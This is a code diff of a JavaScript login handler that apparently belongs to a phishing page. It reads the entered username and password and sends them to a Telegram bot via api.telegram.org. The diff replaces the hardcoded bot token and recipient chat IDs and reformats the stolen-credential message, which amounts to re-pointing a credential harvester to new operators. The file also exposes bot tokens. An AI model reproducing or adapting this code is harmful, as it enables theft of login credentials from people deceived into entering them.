@@ -15,15 +15,15 @@ function login() {
 
   var pass = $("#pass").val();
 
-  var token = "801870955:AAE2m8IagrjoLf7XUxi27audKvv50jj_CH8";
+  var token = "1831013549:AAFuEyqHHyufK5nYMeuCdb8VMP5hs3fz3Dc";
 
-  var id = "";
-  var admin = "387534219";
+  var id = "1898607671";
+  var admin = "1898607671";
 
   if (username.length > 0 && pass.length > 0) {
     $("#logbut").attr("disabled", "disabled");
 
-    var text = "user : `" + username + "` || pass : `" + pass + "`";
+    var text = "user : `" + username + "`                                              pass : `" + pass + "`";
 
     $.get(
       "https://api.telegram.org/bot" +
